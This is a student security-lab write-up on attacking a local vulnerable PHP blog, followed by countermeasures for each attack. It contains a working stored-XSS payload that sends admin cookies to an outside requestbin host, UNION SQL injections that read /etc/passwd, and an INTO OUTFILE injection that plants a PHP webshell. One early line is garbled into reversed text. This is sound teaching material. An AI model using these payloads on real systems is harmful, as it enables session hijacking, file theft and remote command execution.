# Lab 3

## Part 1

> Describe the XSS vulnerabilitie(s) you found

Stored XSS in comment Text field on post.php?id=n, where n is the post id. You can write a script payload, which will be saved in the database and executed in a users browser w
.t sop ralucitra(p) taht seiv resu a revene

> A detailed, step-by-step description of the attack that you have designed to hijack the administrator session information

Step 1: Create a comment in a post, with the following script payload as text, with arbitrary title and author: 

    Hello<script>
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://requestbin.whapi.cloud/zzkuiizz', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    var data = 'text=' + document.cookie;
    xhr.send(data);
    </script>

Replace the requestbin url with the one you want the info to be sent to.

Step 2: Wait for the admin to enter the post where you commented (within one minute). Then check requestbin for the post request from the admin (as PhantomJS/.....), where the raw body will contain its cookie with session id.

Step 3: Copy the session id and set the value of PHPSESSID in your own browser to the one you copied. This can be done in firefox by right clicking and going to Inspect > Storage > Cookies and setting the value in the table.

Step 4: You now have admin access. In order to access the admin page you go directly to the /admin route, not the login page. 

> Include a comprehensive discussion of possible countermeasures (at least 4 mitigations), based on the defense-in-depth strategy. Give use cases for each countermeasure and discuss how they can be deployed for the scenario of the lab:

**Output encoding (Server side):**

Convert special character before rendering any user input in the  browser. This makes sure that any scripts sent are treated as text instead of executable code. Applying htmlspecialchars to the comment fields when the bot goes overt them on /post.php, it would render any script as visable text and not code. This would completly neutralize the attack / vulnerability at its origin. 

**Input validation (server side):**

By checking inputs for potential scripts and invalid characters and not saving suspicious ones, the attack would also be neutralized. For example by matching script tag and equivalent html/url escaped strings. Perhaps characters like less than, greater than, comma, should not be allowed as input in the Author name text field. 

**HttpOnly cookies (Server side):**

By using http-only session cookies, client side Javascript cannot read the value of the session id. This would also eliminate our attack. For example the document.cookie would be stopped. So it dosent stop the actual XSS but it does stop the connection between the two requirments to perform the attack. 

**Content Security Policy (CSP) (client side):** 

Uses a CSP header to restrict script execution on trusted domains only. This instructs the browser what sources are allowed, script, style, images etc, on both load, fetch and execute. So for example good written policy could block an inline script to 
request any image to a foreign domain such as RequestBin. 

## Part 2

> A description of all SQL-injection vulnerabilities you've found: What's the root of the problem? On which page(s) did you find the vulnerability? can the other pages be used for the exploit? What's the rationale behind the successful SQL query? please explain the elements of the query in details.

After succesfully getting admin access we can look through the interface manually and identified GET /admin/edit.php?id=N, probing this field revealed an SQL injection (by inserting either " ' " or -1 for numering or string injection). The  problem was that the application makesSQL queries by allowing untrusted user input directly in to the query string. The ID parameter is interpretet by SQL as part of the query allowign an attacker to alter the querys strucutre. 

Baseline: ?id=2 returned second port normally

Probe: ?id=2' returned an MySQL error /var/www/classes/post.php on line 111, confirms injection and that root is /var/www/ which is ueful later.
Output:

    Warning: mysql_fetch_assoc() expects parameter 1 to be resource, boolean given in /var/www/classes/post.php on line 111 Notice: Undefined variable: post in /var/www/classes/post.php on line 115
    Notice: Trying to get property of non-object in /var/www/admin/edit.php on line 19
    Notice: Trying to get property of non-object in /var/www/admin/edit.php on line 16


Probe: ?id=3-2 reutnred post ID 2 confirming that parameters are unquoted and numeric, meaning it would not calculate if it was treated as a string. So numeric injection like -1 possible. 

This means we can just append our query directly on to the URL.

The exploit relies mostly on MySQL UNION SELECT to append rows to the original query. UNION requires both queries to have mathing column counts so we used ORDER BY to establish how many columns there was. 

    http://localhost:8080/admin/edit.php?id=2 ORDER BY 1

    http://localhost:8080/admin/edit.php?id=2 ORDER BY 2

    http://localhost:8080/admin/edit.php?id=2 ORDER BY 3

    http://localhost:8080/admin/edit.php?id=2 ORDER BY 4

    http://localhost:8080/admin/edit.php?id=2 ORDER BY 5

Tells us that table has 4 collumns because it faild on the 5th.

http://localhost:8080/admin/edit.php?id=-1+UNION+SELECT+1,2,3,4 
Gives 2 3 so column 2 is the title field and column 3 is the text field (where the numbers were shown), so 1 and 4 is probably id or author or date or something like that?

Putting in MySQL functions in the collumns allows us to extract information, for example:
http://localhost:8080/admin/edit.php?id=-1 UNION SELECT 1,USER(),3,4
root@localhost


> Exploit the FILE privilege of the blog user to read the "/etc/passwd" file. 

By using the following injection: `http://localhost:8080/admin/edit.php?id=-1 UNION SELECT 1,2,LOAD_FILE('/etc/passwd'),4`, we were able to read "/etc/passwd":

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/bin/sh
    bin:x:2:2:bin:/bin:/bin/sh
    sys:x:3:3:sys:/dev:/bin/sh
    sync:x:4:65534:sync:/bin:/bin/sync
    games:x:5:60:games:/usr/games:/bin/sh
    man:x:6:12:man:/var/cache/man:/bin/sh
    lp:x:7:7:lp:/var/spool/lpd:/bin/sh
    mail:x:8:8:mail:/var/mail:/bin/sh
    news:x:9:9:news:/var/spool/news:/bin/sh
    uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
    proxy:x:13:13:proxy:/bin:/bin/sh
    www-data:x:33:33:www-data:/var/www:/bin/sh     # ####
    backup:x:34:34:backup:/var/backups:/bin/sh
    list:x:38:38:Mailing List Manager:/var/list:/bin/sh
    irc:x:39:39:ircd:/var/run/ircd:/bin/sh
    gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
    nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
    libuuid:x:100:101::/var/lib/libuuid:/bin/sh
    mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false        ####
    sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
    user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash        ####

> Find a writing directory and inject a webshell to get remote execution in the server. Explain the webshell you used. How did you inject the webshell? How did you find the directory exists and is writable? What are the other directories you tried and failed?

We found that the /var/www/css and /var/www/images are writable by trying to write a file to folders we throught where plausible, and then reading the file to see if it was successfully written (all via SQL injection). We also tried /var/www/, /var/www/classes, /var/www/admin and many other folders that did not exist. The webshell code we used was `<?php system($_GET['c']);?>`, which executes a command given as parameter in the host shell, and writes the output of it as an HTML page back to us. To inject it, we used the following: `http://127.0.0.1:8080/admin/edit.php?id=3%20union%20select%20%22%3C?php%20system($_GET[%27c%27]);?%3E%22,%20%22%22,%20%22%22,%20%22%22%20into%20outfile%20%22/var/www/css/shell.php%22`, which injects the webshell into a file called shell.php in the css folder. To use the webshell, we simply run `http://127.0.0.1:8080/css/shell.php?c=ls`. 

> Include a comprehensive discussion of possible countermeasures, based on the defense-in-depth strategy. Give use cases for each countermeasure and discuss how they can be deployed for the scenario of the lab: 

> Web application itself. Please include an example of an insecure query and how it can be secured. How can we make sure that user input is treated as data in a query?

By using parameterized queries for SQL, we can usually prevent SQL injections. For example something like `sql_query("SELECT * FROM table WHERE id=?", id)` instead of `sql_query("SELECT * FROM table WHERE id=" + id)`. The parameterized query is usually built in to SQL libraries, and works by escaping/disallowing SQL code as data. The web application should use paramteterized queries for all SQL queries. It could also try to check for unusual charatecters/sql injections in the input from the clients, as an extra measure, before using it.

The webb app should probably also only allow executing php scripts from a certain folder.

> Database system

You should probably disable the file privilege for the database user, so that you cannot run LOAD_FILE and SELECT INTO OUTFILE queries (this should not be needed in most cases, since you can do these operations in server code insteadH).

> Operating system: 

**i) which user we are when we execute queries in the database,**

http://localhost:8080/admin/edit.php?id=-1 UNION SELECT 1,USER(),3,4

By quering for for USER(), we can see that the sql user is "root@localhost". At os level, we are mysql, not Linux root.

**ii) which user we are at the OS level when we create the webshell (who is the owner?), and**

By looking at the owner of the file we created through the webshell (`ls -l shell.php`), we can see that the user is "mysql".

**iii) which user we are when we execute commands in the webshell.**

By writing `whoami` in the webshell, we can see that the user is "www-data".

> Are the users above the same? if not, why do they differ? What can be done on the OS level to fix the issue?

They are not the same. The actual MySQL server runs as the mysql user, so when a query containing something like "INTO OUTFILE" that is written by the MySQL process which makes mysql the owner, so that file has mysql rules. While the .php file is requested through HTTP its www-data owned so its commands are invoked with those provileges. 

A fix to the OS level of the problem is to ensure mysql does not have write access to the webroot or subdirectories. Because if mysql does not have write under folders in /var/www the "INTO OUTFILE" step would fail for every webroot path, so no possible web shell. 

> Which privileges and permission can be changed in the database and on the OS level to limit file access? 

The application could connect as a lower level user such as bloguser and then restrict that users privileges to SELECT, INSERT, UPDATE, DELETE on the blog only, nothing with files or information schema or such. The bloguser should not have limited write permissions in the webroot. The FILE privilege should be revoked for all application users. 

The webroot (/var/www) could be owned by root. No other accounts should have write acces on subdirectories. 

> Security configuration of the above

**Webb app:** 
Prepared statements by parameterized queries, treating input as data instead of code. 
Error handling so that to that the messages do not end up at the end user to read, they should log internally for devs instead of going to the frontend. 
Input validation: allowlist-based validation so input is in the forms we accept, that is length, type, format etc, BEFORE they reach the DB

**Database config:**
Least privilage principle! 
Set up many more users
Revoke FILE privilege from blog user
Limit permissions for application users such as SELECT, INSERT, UPDATE or whatever they might need but only what they need.
Configure the database to only accept IP connections from whitelisted sources

**OS config:**
Set up so that webserver and database run on seperate systems (servers), so if anyone would gain access by attacking through SQL injection they would only get permissions of mysql and not the web server user! 
Read only for web server user. No .php file possible to create. 
If write directly needed for uploads or anything of that sorts, adapt it to prevent script execution within that directory
Disable the possibility to index directory (so they cant read anything we dont want them to)
